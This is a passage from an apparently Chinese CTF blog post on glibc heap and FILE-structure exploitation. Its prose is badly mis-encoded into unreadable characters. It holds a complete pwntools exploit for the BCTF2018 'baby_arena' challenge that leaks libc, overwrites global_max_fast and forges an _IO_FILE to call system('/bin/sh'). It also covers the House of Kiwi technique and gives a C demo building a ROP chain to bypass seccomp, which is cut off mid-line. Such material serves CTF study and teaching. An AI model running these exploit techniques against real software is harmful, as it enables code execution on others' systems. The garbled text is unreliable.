href="http://xn--Prolibc-nk0l041n.so">Proåˆ†ælibc.so</a>ï¼ŒæŸ¥æ‰¾<code>_IO_file_jumps</code> åçš„jumpè¡¨å³å¯ã€‚ æ­¤å¤–ï¼Œä»‹ç»ä¸€ç§ç›´æ¥åˆ©ç”¨pwntoolså¾—åˆ°<code>_IO_str_jumps</code> åç§»çš„æ–¹æ³•ï¼Œæ€æƒ³ä¸é‡‡ç”¨åŠ¨æ€è°ƒè¯•åˆ†æçš„æ–¹æ³•ç±»ä¼¼ï¼Œç›´æ¥æ”¾ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_IO_str_jumps</span>():<br>   IO_file_jumps_offset = libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>   IO_str_underflow_offset = libc.sym[<span class="hljs-string">&#x27;_IO_str_underflow&#x27;</span>]<br>   <span class="hljs-keyword">for</span> ref_offset <span class="hljs-keyword">in</span> libc.search(p64(IO_str_underflow_offset)):<br>       possible_IO_str_jumps_offset = ref_offset - <span class="hljs-number">0x20</span><br>       <span class="hljs-keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:<br>          <span class="hljs-keyword">return</span> possible_IO_str_jumps_offset<br></code></pre></td></tr></table></figure><h3 id="ä¾‹é¢˜-v2"><a class="header-anchor" href="#ä¾‹é¢˜-v2">Â¶</a>ä¾‹é¢˜</h3><h4 id="baby-arena-BCTF2018-libc2-27-3ubuntu1-2"><a class="header-anchor" href="#baby-arena-BCTF2018-libc2-27-3ubuntu1-2">Â¶</a>baby_arena_BCTF2018 &lt;libc2.27-3ubuntu1.2&gt;</h4><h5 id="åˆ†æ-v2"><a class="header-anchor" href="#åˆ†æ-v2">Â¶</a>åˆ†æ</h5><p>å’Œ 2.23 ä¸€æ ·ã€‚</p><h5 id="æ€è·¯-v2"><a class="header-anchor" href="#æ€è·¯-v2">Â¶</a>æ€è·¯</h5><p>æ€è·¯å’Œä¸Šé¢˜ä¸€æ¯›ä¸€æ ·ã€‚æ³¨æ„æ”¹ä¸€ä¸‹åç§»ï¼Œä»¥åŠ global_max_fast åˆ©ç”¨æ—¶å€™çš„å †å—å¤§å°ã€‚</p><h5 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">Â¶</a>Exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./baby_arena&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./baby_arena&#x27;</span>)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;4.exit\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,data=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;your note size&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Input your note&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Input id:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aw</span>(<span class="hljs-params">addr0,addr1</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sea(<span class="hljs-string">&#x27;Please input your name&#x27;</span>,p64(addr0)+p64(addr1))<br>    sla(<span class="hljs-string">&#x27;1.admin&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[+]-----Leak the Libc-----[+]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x1430</span>) <span class="hljs-comment"># 1</span><br>dele(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x418</span>)<br>ru(<span class="hljs-string">&#x27;your note is\n&#x27;</span>)<br>libc_leak = uu64(rc(<span class="hljs-number">6</span>))<br>libc_base = libc_leak - <span class="hljs-number">0x3ebca0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x3e8360</span><br>sh_addr = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>system_addr = libc.sym.system<br>global_max_fast = libc_base + <span class="hljs-number">0x3ed940</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[+]-----Global max fast-----[+]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pause()<br><span class="hljs-comment"># aw(one_gadget,libc_base+0x3c67f8-8)</span><br>aw(system_addr,global_max_fast - <span class="hljs-number">8</span>)<br>pause()<br>dele(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x418</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x410</span>+p64(<span class="hljs-number">0</span>))<br>dele(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">FILE</span>(<span class="hljs-params">binsh,system,IO_str_jumps</span>):<br>fake_IO_FILE  = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64((binsh-<span class="hljs-number">100</span>)//<span class="hljs-number">2</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><span class="hljs-comment"># _mode &lt;= 0</span><br>fake_IO_FILE += p64(IO_str_jumps)<br>fake_IO_FILE += p64(system) <span class="hljs-comment"># 0xe0 _s._allocate_buffer</span><br><span class="hljs-keyword">return</span> fake_IO_FILE<br><br>fake_IO = FILE(sh_addr,system_addr,_IO_str_jumps)<br><br>add(<span class="hljs-number">0x1430</span>,fake_IO[<span class="hljs-number">0x10</span>:])<br>dele(<span class="hljs-number">1</span>)<br>pause()<br>sl(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h5 id="è°ƒè¯•-v2"><a class="header-anchor" href="#è°ƒè¯•-v2">Â¶</a>è°ƒè¯•</h5><p>è°ƒè¯•æ‹¿ <strong>_IO_str_overflow</strong> ç®€å•è¿‡ä¸€éã€‚çœ‹å®Œäº† 2.23 å 2.27 åªéœ€è¦æ˜ç™½å’‹è¿›çš„ <code>_IO_str_overflow</code> å°±è¡Œäº†ã€‚</p><p>æˆ‘ä»¬æ„é€ çš„ç»“æ„ä½“ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525200847128.png" alt="image-20220525200847128"></p><p>ç»“æ„ä½“ vtable å‡½æ•°è¡¨ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525200927604.png" alt="image-20220525200927604"></p><p>é‚£ä¹ˆåœ¨éå†åˆ°æˆ‘ä»¬çš„ç»“æ„ä½“è°ƒç”¨ <code>_IO_OVERFLOW</code> å®é™…å°±æ˜¯åœ¨è°ƒç”¨ <code>_IO_str_overflow</code>ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525201020570.png" alt="image-20220525201020570"></p><p>ä¸€è·¯ si è·Ÿè¿›ï¼Œæœ€ååœ¨é¢„æœŸä½ç½® getshell ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525201106629.png" alt="image-20220525201106629"></p><hr><h2 id="Libc"><a class="header-anchor" href="#Libc">Â¶</a>??? &lt;= Libc &lt;= ???</h2><blockquote><p>kiwi æ˜¯åˆ©ç”¨è·¯çº¿ï¼Œå¿…è¦çš„è¯ç”¨ husk è¿‡æ¸¡ï¼Œemma å’Œ pig æ˜¯åˆ©ç”¨æ–¹æ³•ã€‚</p><footer><strong>é£æ²äº‘çƒŸ</strong></footer></blockquote><p>ğŸ‘´ å…¶å®æ˜¯å°±æ˜¯ä¸ºäº†å†™è¿™éƒ¨åˆ†æ‰å¼€çš„è¿™ç¯‡åšå®¢ã€‚ä»è¿™é‡Œå¼€å§‹æ‰èƒ½ç§°ä½œæ˜¯æè‰ºæœ¯ã€‚</p><p><strong>???</strong> çš„æ„æ€æ˜¯è¿™ä¸‹é¢çš„å‡ ä¸ªåˆ©ç”¨æ¶‰åŠåˆ°çš„æ€æƒ³å’Œæ‰‹æ³•ï¼Œä»è¿‡å»ä¸€ç›´åˆ°æœªæ¥çš„ä¸€æ®µæ—¶é—´é‡Œä¸ä¼šè¿‡æ—¶ã€‚</p><p>ä½ æš‚æ—¶çœ‹ä¸åˆ°å°±æ˜¯ ğŸ‘´ è¿˜æ²¡å†™å®Œã€‚</p><h3 id="House-of-Kiwi-libc-2-36æˆ‘çœŸçš„å“­æ­»"><a class="header-anchor" href="#House-of-Kiwi-libc-2-36æˆ‘çœŸçš„å“­æ­»">Â¶</a>House of Kiwi(libc&lt;2.36æˆ‘çœŸçš„å“­æ­»)</h3><p>å…ˆçœ‹ä¸€ä¸‹è¿™å‡ ä¸ªä¸­æˆ‘æœ€å…ˆå­¦ä¹ åˆ°çš„ <strong>kiwi</strong> ï¼Œç”± <code>fmyy</code> å¸ˆå‚…æå‡ºï¼Œå‘è¡¨äº <a href="https://www.anquanke.com/post/id/235598">å®‰å…¨å®¢</a> ã€‚</p><h4 id="åŸç†"><a class="header-anchor" href="#åŸç†">Â¶</a>åŸç†</h4><h5 id="malloc-assert"><a class="header-anchor" href="#malloc-assert">Â¶</a>__malloc_assert</h5><ul><li><p>GLIBC 2.32/malloc.c:288</p><p>glibcä¸­ptmallocéƒ¨åˆ†,ä»ä»¥å‰åˆ°ç°åœ¨éƒ½å­˜åœ¨ä¸€ä¸ªassretæ–­è¨€çš„é—®é¢˜,æ­¤å¤„å­˜åœ¨ä¸€ä¸ª <strong>fflush(stderr)</strong> çš„å‡½æ•°è°ƒç”¨,å…¶ä¸­ä¼šè°ƒç”¨<code>_IO_file_jumps</code> ä¸­çš„syncæŒ‡é’ˆã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs CPP"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br>       <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>(<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>           __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>           file, line,<br>           function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>           assertion);<br><span class="hljs-built_in">fflush</span> (stderr);<br><span class="hljs-built_in">abort</span> ();<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>fflush:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-keyword">define</span> fflush(s) _IO_fflush (s)</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_fflush (_IO_FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> _IO_flush_all ();<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-type">int</span> result;<br>      CHECK_FILE (fp, EOF);<br>      _IO_acquire_lock (fp);<br>      result = _IO_SYNC (fp) ? EOF : <span class="hljs-number">0</span>;<br>      _IO_release_lock (fp);<br>      <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br>libc_hidden_def (_IO_fflush)<br></code></pre></td></tr></table></figure><p>å…¶ä¸­è°ƒç”¨äº† vtable å¯¹åº”åç§»çš„ <code>_IO_SYNC</code> å‡½æ•°ã€‚å¦‚æœä½ çŸ¥é“ä½ç‰ˆæœ¬çš„ FSOP çš„åŸºæœ¬åŸç†ï¼Œé‚£ä¹ˆå¤§æ¦‚å°±çŸ¥é“ <strong>kiwi</strong> çš„åˆ©ç”¨æ€è·¯äº†ã€‚</p></li></ul><h4 id="ä½¿ç”¨åœºæ™¯"><a class="header-anchor" href="#ä½¿ç”¨åœºæ™¯">Â¶</a>ä½¿ç”¨åœºæ™¯</h4><ol><li><p>èƒ½å¤Ÿè§¦å‘<code>__malloc_assert</code>,é€šå¸¸æ˜¯å †æº¢å‡ºå¯¼è‡´ï¼Œä½† ğŸ‘´ å‘ç°å®é™…è¿‡ç¨‹ä¸­å¤§å¤šæ•°éƒ½æ˜¯ ğŸ‘ topchunkã€‚</p></li><li><p>èƒ½å¤Ÿä»»æ„å†™,ä¿®æ”¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_file_sync = setcontext + <span class="hljs-number">61</span><span class="hljs-comment">// &amp;_IO_file_jumps + 0x60</span><br></code></pre></td></tr></table></figure><p>å’Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">IO_helper_jumps + <span class="hljs-number">0xA0</span> and <span class="hljs-number">0xA8</span><br><span class="hljs-comment">//   rsp      rcx</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="ä¿©ç‚¹è¯´æ˜"><a class="header-anchor" href="#ä¿©ç‚¹è¯´æ˜">Â¶</a>ä¿©ç‚¹è¯´æ˜</h4><p>å…³äºåœºæ™¯ 1ï¼ŒğŸ‘ topchunk æœ‰å¾ˆå¤šç§ ğŸ‘ æ³•ï¼Œå¸¸ç”¨çš„æœ‰ï¼š</p><ol><li>ç›´æ¥æº¢å‡ºæˆ–è€…åˆ†é…ä¸ª chunk å»æŠŠ topchunk size æ‰¬äº†</li><li>Largebin Attack é”™ä½æ‰“ topchunk size</li><li>Largebin Attack æˆ–è€…åˆ†é…ä¸ª chunk è¿‡å» ğŸ‘ main_arena ä¸­çš„ topchunk å‘ä½</li></ol><p>å…³äºåœºæ™¯ 2ï¼ŒğŸ‘´ ä¸å¾—ä¸æä¸€å“ˆï¼Œè¿™åªæ˜¯<strong>æœ€åˆæœ€åŸºæœ¬</strong>çš„ kiwi éœ€è¦ä»»æ„å†™è¿™ä¸ªæ¯”è¾ƒå¼ºçš„æ¡ä»¶ï¼Œfmyy å¸ˆå‚…è¿˜æ•™äº† ğŸ‘´ å’Œå…¶ä»–çš„ house ä¸€èµ·ç©çš„ä»… <code>Largebin Attack</code> è¾ƒå¼±æ¡ä»¶æ€è·¯ï¼Œå…·ä½“çš„è¯åç»­çš„ä¾‹é¢˜åº”è¯¥ä¼šæœ‰ã€‚</p><h4 id="Demo-v2"><a class="header-anchor" href="#Demo-v2">Â¶</a>Demo</h4><p>fmyy å¸ˆå‚…æ¼”ç¤ºçš„ DEMOï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs CPP"><span class="hljs-comment">// Ubuntu 20.04, GLIBC 2.32_Ubuntu2.2</span><br><span class="hljs-comment">//gcc demo.c -o main -z noexecstack -fstack-protector-all -pie -z now -masm=intel</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rdi_ret libc_base + 0x000000000002858F</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rdx_r12 libc_base + 0x0000000000114161</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rsi_ret libc_base + 0x000000000002AC3F</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rax_ret libc_base + 0x0000000000045580</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> syscall_ret libc_base + 0x00000000000611EA</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ret pop_rdi_ret+1</span><br><span class="hljs-type">size_t</span> libc_base;<br><span class="hljs-type">size_t</span> ROP[<span class="hljs-number">0x30</span>];<br><span class="hljs-type">char</span> FLAG[<span class="hljs-number">0x100</span>] = <span class="hljs-string">&quot;./flag.txt\x00&quot;</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sandbox</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">prctl</span>(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sock_filter</span> sfi[] =&#123;<br>        &#123;<span class="hljs-number">0x20</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000004</span>&#125;,<br>        &#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0xC000003E</span>&#125;,<br>        &#123;<span class="hljs-number">0x20</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000000</span>&#125;,<br>        &#123;<span class="hljs-number">0x35</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x40000000</span>&#125;,<br>        &#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0xFFFFFFFF</span>&#125;,<br>        &#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x0000003B</span>&#125;,<br>        &#123;<span class="hljs-number">0x06</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x7FFF0000</span>&#125;,<br>        &#123;<span class="hljs-number">0x06</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000000</span>&#125;<br>    &#125;;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sock_fprog</span> sfp = &#123;<span class="hljs-number">8</span>, sfi&#125;;<br>    <span class="hljs-built_in">prctl</span>(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;sfp);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setROP</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>;<br>    ROP[i++] = pop_rax_ret;<br>    ROP[i++] = <span class="hljs-number">2</span>;<br>    ROP[i++] = pop_rdi_ret;<br>    ROP[i++] = (<span 